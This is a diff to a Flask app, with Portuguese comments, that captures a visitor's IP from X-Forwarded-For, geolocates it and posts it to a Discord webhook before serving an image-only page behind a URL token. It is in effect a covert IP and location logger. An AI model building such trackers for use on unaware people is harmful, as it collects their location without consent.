@@ -1,5 +1,4 @@
 from flask import Flask, request, abort
-from flask import Flask, request, abort
 import requests, os
 
 app = Flask(__name__)
@@ -22,18 +21,21 @@ def get_location(ip):
 
 @app.route('/')
 def home():
+    # Captura o IP real do visitante (não o 127.0.0.1 interno)
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
     token = request.args.get("token")
     if token != SECRET_TOKEN:
         abort(403)
 
-    ip = request.remote_addr
     localizacao = get_location(ip)
 
+    # Envia notificação pro Discord
     data = {
         "content": f"📢 Acesso autorizado!\nIP: {ip}\nLocalização: {localizacao}"
     }
     requests.post(WEBHOOK_URL, json=data)
 
+    # Página com somente a imagem centralizada
     return '''
         <html>
         <head>
